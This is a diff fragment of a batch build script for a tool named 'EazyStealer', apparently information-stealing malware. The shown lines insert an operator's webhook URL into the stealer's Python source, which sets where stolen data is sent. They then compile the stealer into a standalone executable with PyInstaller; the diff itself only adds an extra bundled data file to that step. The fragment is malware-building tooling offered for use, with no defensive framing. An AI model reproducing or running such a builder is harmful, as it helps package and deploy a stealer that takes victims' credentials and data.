@@ -9,7 +9,7 @@ if "%webhook_url%"=="" (
 )
 powershell -Command "(gc EazyStealer.py) -replace 'YOUR_WEBHOOK_URL_HERE', '%webhook_url%' | Out-File EazyStealer.py -Encoding utf8
 
-python -m PyInstaller --onefile --hidden-import=encodings EazyStealer.py
+python -m PyInstaller --onefile --hidden-import=encodings --add-data "path_to_data_file;." EazyStealer.py
 
 
 del EazyStealer.spec
